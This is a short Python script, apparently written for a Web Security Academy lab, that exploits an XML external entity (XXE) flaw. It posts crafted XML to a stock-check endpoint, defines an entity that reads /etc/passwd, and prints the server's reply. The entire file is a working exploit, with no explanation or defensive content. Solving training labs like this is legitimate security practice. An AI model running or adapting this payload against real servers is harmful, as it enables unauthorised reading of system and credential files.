#!/usr/bin/python3

import requests

def connect(url, endpoint, payload, payload_exec):

    xml = """<?xml version="1.0" encoding="UTF-8"?>""" + payload + """<stockCheck><productId>""" + payload_exec + """</productId><storeId>1</storeId></stockCheck>"""

    headers = {
        'Content-Type': 'application/xml',
    }

    r = requests.post(url + endpoint, headers=headers, data=xml)
    print(r.text)
    


if __name__ == '__main__':
    url = "https://ac1b1f8c1e4fb8cac032538d00bb00f2.web-security-academy.net"
    endpoint = "/product/stock"
    payload = """<!DOCTYPE foo [ <!ENTITY bigb0ss SYSTEM "file:///etc/passwd"> ]>"""
    payload_exec = """&bigb0ss;"""

    connect(url, endpoint, payload, payload_exec)